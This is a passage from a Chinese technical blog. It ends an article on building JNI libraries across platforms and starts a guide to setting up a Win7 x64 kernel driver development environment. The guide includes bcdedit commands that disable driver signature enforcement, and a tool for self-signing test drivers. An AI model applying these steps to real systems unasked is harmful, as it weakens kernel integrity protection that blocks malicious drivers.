time_utils.cpp time_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c time_utils.cpp -o time_utils.o @echo \"> Compile [time_utils.o] finish.\" clean: @rm -f $(O_ALL_OBJS) @echo \"> Clean [*.o] finish.\" 其中 make.sh 会自动调用 makefile_x64 和 makefile_x86，这样只需要执行一次 make.sh 就可以同时得到 64-bit 和 32-bit 的 [so] 动态连接库文件，执行效果如下图 8所示： [!NOTE|style:flat|label:注意] 其实 [dll] 同样可以模仿 [so] ，通过make命令进行构建。 前面我一直提到一个 Cygwin 工具，其实它是win下的轻量级Linux模拟器。 只要在上面部署好win和Linux的 [交叉编译工具链]，就可以实现一键构建 [dll] 和 [so] 。 7. 填坑：跨平台调试 截至为此，我已经拥有了 [win_x86.dll]、[win_x64.dll]、[linux_86.so]、[linux_x64.so] 两个平台两种位长的四份动态链接库。 理论上Java程序只需根据运行环境加载对应的库文件就可以了。 但实际上总不会这么顺利的。 7.1. 程序无法运行在其他win平台 我把程序打包后，本地测试可以运行。然后部署到其他windows机器，却发现运行报错： java.lang.UnsatisfiedLinkError: ./lib/dt_opt.dll: 应用程序无法启动，因为应用程序的并行配置不正确。有关详细信息，请参阅应用程序事件日志，或使用命令行 sxstrace.exe 工具。 　　at java.lang.ClassLoader$NativeLibrary.load(Native Method) 　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1803) 　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1699) 　　at java.lang.Runtime.load0(Runtime.java:770) 　　at java.lang.System.load(System.java:1003) java.lang.UnsatisfiedLinkError: ./lib/dt_opt.dll: 由于应用程序配置不正确，应用程序未能启动。有关详细信息，请参阅应用程序事件日志，或使用命令行 sxstrace.exe 工具。 　　at java.lang.ClassLoader$NativeLibrary.load(Native Method) 　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1803) 　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1699) 　　at java.lang.Runtime.load0(Runtime.java:770) 　　at java.lang.System.load(System.java:1003) 经历多番周折，我已经临危不乱了：我本地可以运行，第三方机器运行不了，这明显就是运行环境的问题。 对运行环境条件做排除分析，很快就定位原因是第三方机器缺少了VC的运行库（类比的话就是Java的JVM虚拟机）。我尝试为第三方机器安装VC的运行库，再次运行，成功。 但这不是我期望的答案：我不可能要求所有第三方机器都安装VC的运行库，这太荒谬了。 问题回归本质：是否有办法把我程序所需的运行库一并编译到我的程序中？ 答案是肯定的，而且也很容易处理（详细参看这里）。 只需在用VS2010编译DLL前，【右键项目-> 属性-> 配置属性-> C/C++ -> 代码生成-> 运行时库-> 选MTD】，即可把DLL所需的运行库静态编译到DLL中，如下图 9所示： [!NOTE|style:flat|label:注意] 默认情况下是 [动态编译]， 即 [dll] 在运行时才去找 [运行库]。 而修改成 [静态编译] 后，[运行库] 已经被写入 [dll] ，也就无需再去找。 不过事到如今，也不需要我多说 [动态] 和 [静态] 了，副作用是 [dll] 文件增大了几百K。 7.2. x86和x64运行结果不一致 程序运行问题解决了，运行结果的问题又接踵而来了。 我发现程序运行在x86环境与x64环境完全不同，即使入参一模一样！ 问题一出现，根据经验很快就被我锁定是C++代码出现的位长问题。但具体是哪个位置，就只能一步步调试并锁定范围了，因为这不是BUG，不会抛异常定位，只能一步步跟踪数据调试，前前后后整整花了3天时间。。。至于具体的调试过程我就不说了，只说结果。 老实说，这个C++代码并不是完全由我执笔的，一些公共的模块是出自他人之手，对这部分代码不熟悉，加上该工程的代码量也相当多，这都是造成调试慢的原因。 最后找到的问题根源是，一个 [_ulong] 类型的数据，在执行位运算时，x86和x64的机器得到了完全不同的结果。其中x86的结果完全是数值溢出。 再追踪 [_ulong] 的类型定义，竟然是这样写的： typedef unsigned long _ulong; 乍一看似乎没问题，但如果问long的位长是多少，很多同学未必答得出来。偶然情况下，我发现了这个同学的sizeof测试（传送门），我不能说他的测试结果是错的，只能说存在局限性。 Java与C/C++在数据类型的字长定义上，最大的区别是Java是固定精度，C/C++则不然。 举个栗子： Java的int类型，放到哪里都是32位（4字节），long类型放到哪里都是64为（8字节），这就是固定精度。 C/C++的int类型，一般情况下也都是32位（4字节），但long类型的精度定义则为 [>= int]，在32-bit平台上是32位（4字节），在64-bit平台上则是64位（8字节）。 如下附一张字长模型表，大家会看得比较清晰。其中[LP64]、[ILP64]、[LLP64]是64位平台上的字长模型，[ILP32]、[LP32]是32位平台上的字长模型。 I、L、P 分别代表 int，long，pointer（想知道更详细的请跳去看这篇原文）。 数据类型 LP64 ILP64 LLP64 ILP32 LP32 char 8 8 8 8 8 short 16 16 16 16 16 _int32 N/A 32 N/A N/A N/A int 32 64 32 32 16 long 64 64 32 32 32 long long N/A N/A 64 N/A N/A pointer 64 64 64 32 32 回到运行结果不一致的问题本身，既然问题根源找到了，修改也就简单了，只需这样修改类型定义即可： #ifdef _LP64 typedef unsigned long _ulong; #else typedef unsigned long long _ulong; #endif 重新编译程序运行，问题解决。 8. 回顾：嵌入式开发入门过程 到这里为止，我的嵌入式开发入门之路已经算告一段落。 我自知前面讲述的内容较多，应该不少小伙伴还找不到重点看，我在这里简单梳理一下java-cpp的嵌入式开发过程： （1）在Java程序定义JNI接口； （2）利用JNI命令生成C/C++的头文件； （3）用C/C++实现头文件中声明的接口（实现过程中，注意Java与C/C++在参数传递时的类型转换，以及C/C++的数据类型字长问题）； （4）根据编写好的C/C++程序代码，构建成Win平台的32-bit和64-bit动态链接库（dll文件，推荐用VS2010，并使用静态编译方式）； （5）根据编写好的C/C++程序代码，构建成Linux平台的32-bit和64-bit动态链接库（so文件，推荐用make + GCC）； （6）Java程序根据操作系统类型、位长选择动态链接库。 9.后话 最后谈谈我在做完java-c的嵌入式开发入门后的个人感悟： （1）真正了解了什么才是 [跨平台]，时刻谨记语言的平台特性，不要因为长期浸淫在Java的好处中就被它迷惑了，尤其是自认对Java经验越丰富的时候。 （2）Java会自动回收内存，C/C++需要自我监管，内存泄露可不是好玩的。 （3）Java字长都是固定的，C/C++则不然，数据截断足够你调试一个月。 （4）别再幻想兼容了，Java是 [一次编译，到处运行]，C/C++是 [一次编码，到处编译]。 另外就是，前面的题外话中我一直有提及 [Cygwin] ，但整篇文章都没有正式介绍，原因是我在过程中发现， [交叉编译] 的坑更大，所以被我早早抛弃了。 我简单介绍一下吧。 先说明下 [交叉编译] 是什么。交叉编译就是在机器A中编译可以让机器B运行的程序，但A和B是两套完全不同的系统平台。举个栗子就是那些做爪机开发的同学，其实做的就是 [交叉编译]。 更详细的自己去问度娘吧，有这个概念就可以了。 接下来说明下 [Cygwin] 。Cygwin是运行于win平台的Linux虚拟机，虽然功能受限，但是如果只用于 [交叉编译] 就足够用了。 默认情况下， [Cygwin] 会调用win平台自身的GCC编译器，这时通过与Linux一样的make命令就可以构建出dll文件。然后再为 [Cygwin] 安装Linux平台的GCC编译器，同样地利用make命令就可以构建出so文件。 因此在理论上，可以直接通过 Cygwin + GCC + make， 一键构建出 [win_x86.dll]、[win_x64.dll]、[Linux_x86.so]、[Linux_x64.so] 这四个动态链接库。 但实际操作上，Cygwin 安装交叉编译工具链的过程冗长且容易出错，我最终选择了暂时放弃，有兴趣的同学可以自己去找找相关文档，我手上也有一些当时我参考过的，可以转发给大家： 文献 来源 arm-linux-gcc交叉编译工具链安装 传送 Windows+cygwin下构造arm-linux交叉编译环境最简单的方法 传送 在window平台下模拟Liunx使用GCC环境进行编译C的SO库 传送 (笔记)Ubuntu下安装arm-linux-gcc-4.4.3.tar.gz (交叉编译环境) 传送 eclipse下使用cygwin的方法（Windows下用eclipse玩gcc/g++和gdb） 传送 10. 资源下载 本文全文下载（CSDN： PDF） 本文 Java样例程序【OTP动态令牌】 Github 完整源码（Eclipse Maven项目） 文本 C++样例程序【OTP动态链接库】 Github 完整源码（VS2010 DLL项目） Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/re/驱动开发入门1.html":{"url":"markdown/technical/re/驱动开发入门1.html","title":"驱动开发入门1：开发环境搭建","keywords":"","body":"驱动开发入门 – 之一：Win7 SP1 x64 驱动开发环境搭建1. 概述1.1. 前言1.2. 名词解析1.3. WDK简史2. 操作系统与预装组件3. 相关工具安装3.1. 安装清单3.2. WDK的安装与配置4. 驱动开发环境配置4.1. 环境1（不推荐）：VS2008 + DDKWizard4.2. 环境2（推荐）：VS2010 + EasySYS5. 驱动程序签名5.1. 背景5.2. 自签名工具 - 64Signer的安装与使用6. 驱动程序的加载与调试6.1. 在虚拟机搭建测试环境6.2. 驱动加载6.3. 驱动调试7. 附录1：环境搭建常见异常解决方案7.1. VS2008 / VS2010安装失败7.2. [Error 1275] - 此驱动程序被阻止加载7.3. [Error 577] - Windows无法验证此文件的数字签名 某些软件或硬件最近有所更改，可能安装了签名错误或损毁的文件，或者安装的文件可能是来路不明8. 附录2：DDKWizard - ddkbuild脚本参数解析9. 附录3：相关知识科普9.1. Windows程序的运行层级9.2. 驱动模式9.3. 驱动程序类型9.4. 驱动的签名与认证10. 资源下载驱动开发入门 – 之一：Win7 SP1 x64 驱动开发环境搭建 1. 概述 1.1. 前言 适读人群：具备良好的C/C++开发经验，一定的逆向工程基础。 本文仅讲述在Win7 SP1 x64系统中，搭建基于WDK7600的驱动开发环境，不会解析任何驱动开发的代码。 之所以撰写本文，是因为网上充斥着大量已经过时的基于WinXP(x86)-DDK的驱动开发教程、或针对Win(x64)-WDK但不成体系的驱动开发教程，导致新同学在搭建开发环境时遇到的各种问题难以被解决。 所谓工欲善其事、必先利其器，特此记录并整理了在64位系统中，从搭建驱动环境到安装调试驱动程序的每个步骤、可能遇到的问题以及解决方案，以供其他同学做入门参考，降低学习成本。 另外驱动程序是不存在兼容一说的（即x86的驱动只能运行在x86系统、x64的驱动只能运行在x64的系统），但是x86已经被逐步淘汰了，因此本文只会针对x64进行说明（其实x86也是大同小异）。 1.2. 名词解析 名词 英文原文 解析 VxD Virtual Device Driver 虚拟设备驱动程序 DDK Device Development Kit 设备驱动程序开发工具包，广泛应用于XP-x86年代，已淘汰 WDM Windows Driver Model Windows驱动模型 WDK Windows Driver Kit Windows驱动开发工具 WDF Windows Driver Foundation Windows驱动开发框架 MSDN Microsoft Developer Network 微软以 Visual Studio 和 Windows 平台为核心整合的开发虚拟社区提供面向软件开发者的信息服务（包括技术文档、产品下载、Blog等） KMDF Kernel-Mode DriverFramework 内核模式驱动程序 UMDF User-Mode DriverFramework 用户模式驱动程序 chk Checked（debug） 调试版本标识 fre Free（retail，或release） 发布版本标识 1.3. WDK简史 ——部分内容摘于博文：http://lib.csdn.net/article/dotnet/41373 早期的Windows 95/98的设备驱动是VxD，其中x表示某一类设备。从Windows 2000开始，开发驱动程序必以WDM为基础的，但如果使用DDK来开发WDM，其开发难度之大，根本不能奢望像用户模式应用程序开发那样容易。 为改善这种局面，从Vista开始，微软推出了新的驱动程序开发环境WDF。WDF是微软提出的下一代全新的驱动程序模型，它是在WDM的基础上发展而来的，支持面向对象、事件驱动的驱动程序开发，提供了比WDM更高层次抽象的高度灵活、可扩展、可诊断的驱动程序框架。WDF框架管理了大多数与操作系统相关的交互，实现了公共的驱动程序功能（如电源管理、PnP支持），隔离了设备驱动程序与操作系统内核，降低了驱动程序对内核的影响。 在众多WDK版本之中，WDK7600算是承上启下的一个版本。因为在此之前的驱动开发主要都是基于XP的DDK，难度过大且已过时。 微软在Win7/Vista时期对DDK做了集成优化衍生出WDK，且适用于之后的Win8/Win10。 但是微软在WDK7600以后就不再提供独立的内核驱动开发包了，并以Win8/Win10+WDK10 为主提供了集成度更高的WDF（使得Visual Studio可以集开发、编译、安装、部署和调试于一身），但是环境配置差异变化较大，且由于本人不喜欢Win8/Win10系统，有兴趣的同学可以自行研究，本文仅以WDK7600为核心搭建驱动环境。 2. 操作系统与预装组件 ① 系统版本： Win7 SP1 x64 （必须升级到SP1版本） ② C/C++ x64 .NET 库：需安装四个版本 [v2.0.50727] [v3.0] [v3.5] [v4.0.30319] ③ Microsoft Office 2007：安装 Visual Studio IDE（VS2008 / VS2010）前置组件 3. 相关工具安装 3.1. 安装清单 部分工具的功能是重复的，请根据下文所建议的两种开发环境选择性安装。 表 1 安装清单（安装顺序建议与清单保持一致） 工具 版本 用途 备注 下载 Visual Studio 2008 x64 C/C++程序开发IDE用于驱动程序编码 需先安装前置程序/库：.NET x64 v2.0.50727.NET x64 v3.0.NET x64 v3.5.NET x64 v4.0.30319Microsoft Office 2007   Visual Studio 2010 x64 C/C++程序开发IDE用于驱动程序编码 需先安装前置程序/库：.NET x64 v2.0.50727.NET x64 v3.0.NET x64 v3.5.NET x64 v4.0.30319Microsoft Office 2007   Visual Assist X 10.8.2007 VS IDE 辅助插件 可选安装，提供编码提示、补全等辅助功能 CSDN WDK 7600 微软提供的Win驱动开发工具包 提供驱动开发的API（头文件）、库文件等 官方地址 DDKWizard 1.3a VS2008驱动模板生成插件 可在VS2008中直接创建驱动程序开发模板 官方地址CSDN ddkbuild.batddkbuild.cmd 1.3a VS2008驱动程序生成脚本 需配合WDK与DDKWizard使用 官方地址CSDN EasySYS 0.3.2.7 VS2010驱动模板生成工具 生成可被VS2010导入的驱动程序开发模板 CSDN 64Signer 1.2 内核驱动程序数字签名工具 Win7之后的64位系统的内核驱动程序必须具备数字签名，此工具可伪造测试用的数字签名 CSDN DriverMonitor 3.2.0 内核驱动程序调试器 XP x86用于安装、启动内核程序的调试工具，Win7 x64可能不兼容 CSDN InstDrv 1.3.0 内核驱动程序调试器 Win7用于安装、启动内核程序的调试工具 CSDN DebugView 4.81 内核驱动消息捕获器 配合DriverMonitor或InstDrv使用，用于调试内核程序断点打印消息 CSDN VMWare 11.1.2 虚拟机 用于搭建隔离环境调试驱动程序   WinDbg   Windows平台下的用户态和内核态调试工具 用于配合虚拟机双机调试驱动程序 官方地址CSDN 3.2. WDK的安装与配置 下载WDK的安装镜像GRMWDK_EN_7600_1.ISO，安装到任意目录即可。 本文的安装目录为：E:\\04_work\\re\\WDK 环境变量配置： ① 右击【计算机】-->【属性】-->【高级系统设置】-->【高级选项卡】-->【环境变量】 ② 在【系统变量】中新建四个变量： 变量名 变量值 备注 W7BASE E:\\04_work\\re\\WDK Win7用， Win7 必须配置 WLHBASE E:\\04_work\\re\\WDK Win Vista\\2008 用，Win7 必须配置 WNETBASE E:\\04_work\\re\\WDK Win 2003 用，Win7可选配置 WXPBASE E:\\04_work\\re\\WDK Win XP 用，Win7可选配置 注：建议添加所有环境变量 4. 驱动开发环境配置 VS2008 与 VS2010 两种开发环境 任选其一即可 。 若只是开发简单的驱动程序且不涉及到汇编指令，VS2008环境更便捷。但若驱动程序需要嵌入汇编语言，则推荐使用VS2010。 两种开发环境的差异比较如下： - VS2008 + DDKWizard VS2010 + EasySYS 自动生成WDK开发模板 支持（IDE内生成） 支持（IDE外生成，需导入） 需修改的开发配置项 WDK环境依赖WDK配置参数（source文件）编译平台位数编译命令参数 WDK环境依赖WDK配置参数（source文件） 支持编译位数 x86（默认）x64（需修改平台和命令参数） x86（需修改平台）x64 （默认） 驱动程序签名方式 手动关闭系统签名校验手动对驱动签名 手动关闭系统签名校验手动对驱动签名 混合汇编 x86：支持(__asm{}内联汇编)x64：兼容性差(DDK工程无法自动编译*.asm文件) x86：支持(__asm{}内联汇编)x64：支持(WDK工程可自动链接到*.asm文件混合编译) 4.1. 环境1（不推荐）：VS2008 + DDKWizard 4.1.1. VS2008的安装与配置 ① 安装VS2008（任意位置即可） ② 打开VS2008 ，设置WDK环境依赖： 【工具】-->【选项】-->【项目和解决方案】-->【VC++目录】 --> 右侧【平台】选择【x64】 ，按下表添加WDK目录（需置顶并确保顺序）： - x64平台（即64位编译环境） Win32平台（不必配置，仅参考） 可执行文件 &(W7BASE)\\bin\\x86\\amd64&(W7BASE)\\bin\\x86 &(W7BASE)\\bin\\x86&(W7BASE)\\bin\\x86\\x86&(W7BASE)\\tools\\pfd\\bin\\bin\\x86 包含文件 &(W7BASE)\\inc\\api&(W7BASE)\\inc\\crt&(W7BASE)\\inc\\ddk&(W7BASE)\\inc\\wdf&(W7BASE)\\inc\\wdf\\kmdf\\1.9&W7BASE)\\inc &(W7BASE)\\inc\\api&(W7BASE)\\inc\\crt&(W7BASE)\\inc\\ddk&(W7BASE)\\inc\\wdf&(W7BASE)\\inc\\wdf\\kmdf\\1.9&(W7BASE)\\inc 库文件 &(W7BASE)\\lib\\win7\\amd64 &(W7BASE)\\lib&(W7BASE)\\lib\\wdf\\kmdf\\i386\\1.9&(W7BASE)\\lib\\wxp\\i386 源文件 &(W7BASE)\\src &(W7BASE)\\src 备： 经测试第②步不论是否在x64平台配置WDK目录也可成功编译DDK（前提是配置了上文的环境变量），而且一旦配置了这些目录，会导致x64平台只能编译DDK项目，无法在编译普通的控制台程序（VS2008的解决方案平台是所有项目共用的，VS2010则是独立的）。所以建议只有在不配置就无法编译DDK的情况下才执行第②步。 4.1.2. DDKWizard的安装与配置 ① 安装DDKWizard（任意位置即可） ② 在WDK根目录下新建文件夹script，把 ddkbuild.bat 和 ddkbuild.cmd 复制进去。 ③ 修改【系统变量】中【Path】变量值，末尾添加 ;%W7BASE%\\script; ④ 安装成功后，在VS2008中新建项目时会增加一个 DDK Project 的模板，利用该模板创建WDK项目，会自动调用ddkbuild.cmd 脚本编译驱动程序。 4.1.3. WDK项目创建、配置与发布 ① 打开VS2008 ， 【文件】-->【新建】-->【项目】-->【DDK Project】 ，如图 1。 ② 此处选择【Driver】模板（会自动创建默认接口代码），然后填写WDK项目名称（本文样例项目为VS2008_WDK_Demo），点击【确定】后，如图 2配置即可。 ③ 为项目添加64位编译器（前面已设置好WDK环境依赖）：点击上方【Win32】 --> 【配置管理器】 --> 【活动解决方案平台】 --> 【新建】 --> 【x64】 --> 【确定】 ， 如图 3。 ④ 配置sources文件：sources文件为ddkbuild脚本用于编译驱动程序的配置文件，如图 4。 一般情况下，只需关注【TARGETTYPE】和【SOURCES】属性即可： 属性 取值 备注 TARGETTYPE DRIVER 固定值，声明所编译的类型为“驱动” SOURCES 项目中【Source Files】（*.cpp）和【Resource Files】（*.rc）中所有文件名称集合 值格式如下（其中\\表示断行）：SOURCES=A.cpp \\ 　　　　　B.cpp \\ 　　　　　....　　　　　Z.cpp ⑤ 修改ddkbuild.cmd 脚本入参：【项目】-->【属性】-->【配置属性】-->【NMake】，如图 5，把【“生成”命令行】和【“全部重新生成”命令行】的值修改为： &(DDKBUILD_PATH) -W7X64 checked . -cZ -prefast ⑥ 编译项目：【生成】-->【（重新）生成解决方案】 若上述配置均正确，则编译成功。默认情况下会在项目根路径下生成目录objchk_win7_amd64（注意目录名称带有64位标识才表示该驱动是64位的）。 编译得到的【objchk_win7_amd64\\amd64\\VS2008_WDK_Demo.sys】即为内核驱动程序。 4.2. 环境2（推荐）：VS2010 + EasySYS 4.2.1. VS2010的安装与配置 ① 安装VS2010（任意位置即可） ② 暂不需要任何配置。 之所以不需要类似于VS2008配置WDK环境依赖，是因为使用EasySYS生成的项目会默认配置好这些值。如图 8 查看WDK环境依赖配置，导入EasySYS生成的项目后，可以通过 右键项目 --> 【属性】-->【配置属性】-->【VC++目录】 查看这些环境配置（注意使用的环境变量是WLHBASE，而非W7BASE，这也是为什么【3.3.2 WDK的安装与配置】需要配置这两个环境变量）。 4.2.2. EasySYS的安装与配置 VS2010 暂无类似于DDKWizard的内置插件辅助创建WDK项目，因此需要EasySYS在外部直接生成WDK项目模板，再由VS2010导入项目（此工具也适用于VS2008）。 ① EasySYS无需安装，在任意位置运行均可 ② 填写【工程名称】（即WDK项目名称，本文样例项目为VS2010_WDK_Demo） ③ 选择【保存路径】（本文样例路径为D:\\01_workspace\\c\\vs2010\\re\\VS2010_WDK_Demo） ④ 【编译环境】选择【VS 2010】， 【DDK版本】选择【WDK 7600.16385.1】，【目标系统】勾选【Windows 7】，其他任意即可，如图 9。 ⑤ 点击【确定】后则会自动生成VS2010项目，如图 10。 4.2.3. WDK项目导入、配置与发布 ① 打开VS2010 ， 【文件】-->【打开】-->【项目/解决方案】，选择EasySYS所生成的项目配置文件D:\\01_workspace\\c\\vs2010\\re\\VS2010_WDK_Demo\\VS2010_WDK_Demo.sln，打开项目。 ② 为项目添加64位编译器（前面已设置好WDK环境依赖）：点击上方【Win32】 --> 【配置管理器】 --> 【活动解决方案平台】 --> 【新建】 --> 【x64】 --> 【确定】 ， 如图 11。 ③ 添加WDK相关文件：右键项目 --> 【添加】 --> 【新建过滤器】 --> 填写【WDK文件】（名称任意即可）。 右键【WDK文件】 --> 【添加】 --> 【现有项】 ，选择【sources】【makefile】【BuildDrv.bat】【clean.bat】四个文件，如图 12（其实只需添加sources文件即可）。 ④ 配置sources文件：sources文件为ddkbuild脚本用于编译驱动程序的配置文件，如图 13。 一般情况下，只需关注【TARGETTYPE】和【SOURCES】属性即可： 属性 取值 备注 TARGETTYPE DRIVER 固定值，声明所编译的类型为“驱动” SOURCES 项目中【Source Files】（*.cpp）和【Resource Files】（*.rc）中所有文件名称集合 值格式如下（其中\\表示断行）：SOURCES=A.cpp \\ 　　　　　B.cpp \\ 　　　　　....　　　　　Z.cpp ⑤ 编译项目：【生成】-->【（重新）生成解决方案】 若上述配置均正确，则编译成功。默认情况下会在项目根路径下生成目录objchk_win7_amd64（注意目录名称带有64位标识才表示该驱动是64位的）。 编译得到的【objchk_win7_amd64\\amd64\\VS2010_WDK_Demo.sys】即为内核驱动程序。 5. 驱动程序签名 5.1. 背景 ——摘于博文：http://www.yiiyee.cn/Blog/64signer/ 微软对于自Vista开始的64位OS有新的数字签名策略，即所有内核驱动都必须是经过可信机构签发过数字证书的，否则系统拒绝加载，其目的是为了加强系统安全防护，使得XP时代来历不明的内核模块无法在系统中容身。 但它却也给正经的内核开发人员带去了一个麻烦：开发过程中会不断生成新的驱动镜像文件，开发者不可能将每一个内部版本都拿去申请数字签名，一来不是所有开发者都可以负担起签证费用，二来签名过程麻烦，会大大延长开发周期。 因此在本文中，无论【环境1】所生成的内核驱动程序【VS2008_WDK_Demo.sys】，抑或是【环境2】所生成的内核驱动程序【VS2010_WDK_Demo.sys】，在签名前均无法被系统加载。 5.2. 自签名工具 - 64Signer的安装与使用 64Signer可以对内核驱动程序签名（未通过MS认证的自签名，仅可用于测试）。 此工具无需安装，直接把【环境1】或【环境2】所生成的内核驱动文件拖拽到64Signer，点击【签名】。若签名成功，右击内核驱动文件 --> 【属性】，会出现【数字签名】选项卡，如图 17所示： 6. 驱动程序的加载与调试 6.1. 在虚拟机搭建测试环境 前文所编译生成的【VS2008_WDK_Demo.sys】或【VS2010_WDK_Demo.sys】驱动程序是无法直接在VS2008/VS2010中运行的（即使可以也不建议直接在开发机上运行），因为驱动程序运行在系统内核，稍有不慎就会导致蓝屏。 为此建议转移到虚拟机中执行驱动的装载和调试。 以VMWare虚拟机为例（先预装Win7 x64 SP1系统），先把虚拟机中的操作系统切换到测试模式，具体步骤如下： ① 在虚拟机中以管理员身份通过【win+R】 --> 【cmd】 打开DOS控制台。 ② 输入命令【bcdedit /set testsigning on】 开启系统测试模式。 ③ 输入命令【bcdedit -set loadoptions DDISABLE_INTEGRITY_CHECKS】，关闭系统的强制校验驱动签名功能。 ④ 重启系统使得②③设置生效。若设置成功，重启后在桌面右下角会出现当前系统为测试模式的水印，如图 18所示（某些系统会屏蔽这个水印，此时可以通过命令【bcdedit /enum】确认testsigning的值是否为Yes以判断系统当前是否处于测试模式，如图 19）。 [!NOTE|style:flat|label:注意] 上述 ②③ 步骤中的两个bcdedit命令只需执行一次，永久生效。 若不执行这两个命令，驱动程序即使签名了也无法被系统加载。 这两个bcdedit命令对应的恢复命令为： bcdedit -set loadoptions DENABLE_INTEGRITY_CHECKS bcdedit /set testsigning off 6.2. 驱动加载 常用的加载驱动程序的工具有两个： ① DriverMonitor：若加载失败会提示错误原因，但对部分Win7x64系统兼容性不好。 ② InstDrv：若加载失败无错误原因提示，可运行于x64位系统。 这两个工具的使用比较简单，参照图 20和图 21即可，此处就不再详细说明了。 6.3. 驱动调试 6.3.1. DebugView调试 在驱动程序被DriverMonitor / InstDrv加载、并启动成功后，若驱动程序中有使用了DbgPrint / KdPrint 输出消息（这两个语句的作用类似于开发应用程序时的控制台输出语句），则可同时启动 DebugView 对 dbgPrint / kdPrint 输出的消息进行实时捕获。 由于DebugView是实时捕获消息，因此需要在驱动程序被加载前启动。启动DebugView后，如图 22配置，勾选【监视】下的【监视核心】、【启用详细核心输出】、【全部通过】、【监视事件】，捕获的消息如图 23所示。 6.3.2. VMWare + WinDbg双机调试 此部分扩展内容较多，以后再另建文档作为独立教程详细说明。 7. 附录1：环境搭建常见异常解决方案 7.1. VS2008 / VS2010安装失败 99%的原因都是因为缺失 .NET库 或 .NET的相关配置文件。 尤其是非官方原版的GHOST系统，经常会被第三方出于某些目的修改、移动、删除.NET的库文件。 更为致命的是 VS2008 / VS2010 安装过程中若出错，除了给出异常编码，不会有任何原因提示，目前通过百度找的办法也并非适合普罗大众，这里根据我个人的经验做一个总结： ① Win7下建议安装VS2010，这是微软专门为win7开发的版本 ② 确保Microsoft Office 2007已安装成功 ③ 确保.NET库文件已全部安装成功，需要同时安装4个版本： .NET x64 v2.0.50727 .NET x64 v3.0 .NET x64 v3.5 .NET x64 v4.0.30319 ④ 若.NET库安装失败，可从其他Win7机器拷贝（或者网上下载）.NET的安装目录到以下两个对应目录： C:\\Windows\\Microsoft.NET\\Framework C:\\Windows\\Microsoft.NET\\Framework64 上述4步均执行成功后，再安装 VS2008 / VS2010 一般来说可以畅通无阻了。 但VS有些内置组件在安装过程可能报错，只能独立安装，这里也总结一下： 7.1.1. VS2008 安装过程报错：ISetupComponent::Pre/Post/Install() failed in ISetupManager::InternalInstallManager() with HRESULT -2147023293 异常原因： 安装 Microsoft Office 2007失败。 解决方案： 先尝试重装 Microsoft Office 2007， 若依旧出现此错误，则按如下步骤处理： ① 把vs2008镜像文件下的 \\WCU\\WebDesignerCore\\WebDesignerCore.EXE 右键解压到（注意解压出来的文件夹里面有个Office.zh-cn）。 ② 把 Microsoft Office 2007 光盘或光盘镜像中的Office.zh-cn文件夹 覆盖到 VS2008 的Office.zh-cn。 ③ 运行第一步解压出来的文件中的setup.exe安装 Microsoft Office 2007 7.1.2. VS2008 安装过程报错：X64 远程调试器未成功安装 异常原因： 缺失 .NET 相关库文件（但是具体缺失了什么缺没有提示）。 解决方案： ① 手动解压 VS2008 的安装光盘，运行安装目录下的这个内置组件： \\Remote Debugger\\x64\\rdbgsetup.exe ② 此时若内置组件安装失败，就会提示具体失败原因了（一般都是缺失.NET4.0库下的 \\CONFIG\\machine.config 文件） ③ 在网上下载对应文件放到报错目录，或者重装对应版本 .NET 库应该可以解决。 7.1.3. VS2010 安装过程报错：Error: Installation failed for component Microsoft Visual Studio 2010 64bit Prerequisites (x64). MSI returned error code 1603 异常原因： 缺失 .NET 相关库文件（但是具体缺失了什么缺没有提示）。 解决方案： ① 手动解压 VS2010 的安装光盘，依次运行安装目录下的几个内置组件： \\WCU\\64bitPrereq\\x64\\VS_Prerequisites_x64_chs.msi \\WCU\\SSCE\\SSCERuntime_x64-chs.msi \\WCU\\SSCE\\SSCERuntime_x86-chs.msi \\WCU\\SSCE\\SSCEVSTools-chs.msi ② 此时若内置组件安装失败，就会提示具体失败原因了（一般都是缺失.NET2.0库下的 \\CONFIG\\machine.config 文件） ③ 在网上下载对应文件放到报错目录，或者重装对应版本 .NET 库应该可以解决。 7.2. [Error 1275] - 此驱动程序被阻止加载 使用DriverMonitor / InstDrv加载驱动程序成功，但启动时报错（如图 24）： Error (1275):此驱动程序被阻止加载 异常原因： 在64位系统加载32位驱动程序、或者在32位系统加载64位驱动程序。 解决方案： 根据用于加载驱动的操作系统的位数，使用对应的平台重新编译驱动程序即可。 7.3. [Error 577] - Windows无法验证此文件的数字签名 某些软件或硬件最近有所更改，可能安装了签名错误或损毁的文件，或者安装的文件可能是来路不明 使用DriverMonitor / InstDrv加载驱动程序成功，但启动时报错（如图 25）： Error (577):Windows无法验证此文件的数字签名 某些软件或硬件最近有所更改，可能安装了签名错误或损毁的文件，或者安装的文件可能是来路不明 异常原因： 以下三个条件任意一条不满足： ① 驱动程序已进行数字签名 ② 操作系统已进入测试模式 ③ 操作系统已关闭数字签名校验 解决方案： 确保以下四个操作已全部执行： ① 使用64Signer对驱动程序进行数字签名 ② 在DOS下执行bcdedit /set testsigning on命令进入测试模式 ③ 在DOS下执行bcdedit -set loadoptions DDISABLE_INTEGRITY_CHECKS命令关闭系统的强制校验驱动签名功能 ④ 重启电脑（使得②③命令生效） 8. 附录2：DDKWizard - ddkbuild脚本参数解析 默认情况下，ddkbuild.cmd 脚本所编译的驱动程序是32位的（即使在VS2008选择了x64编译平台），此情况可从编译驱动程序后的输出目录名称得到验证（如objchk_win7_x86）。 要使得所编译的驱动程序为64位，则需把脚本入参中的平台参数修正为对应的X64平台。命令格式可通过编辑ddkbuild.bat查看，如图 26。平台参数枚举可通过编辑ddkbuild.cmd查看，如图 27。修改后重新编译驱动程序，输出目录名称默认会包含64位标识（如objchk_win7_amd64）。 例如本文【环境1】中默认的脚本命令如下，其中平台参数为 -W7（即win7x86）： $(DDKBUILD_PATH) -W7 checked . -cZ -prefast 修改为对应的64位平台参数 -W7X64 即可编译出64位驱动： $(DDKBUILD_PATH) -W7X64 checked . -cZ -prefast 9. 附录3：相关知识科普 9.1. Windows程序的运行层级 ——摘于博文：http://www.cnblogs.com/findumars/p/5557283.html 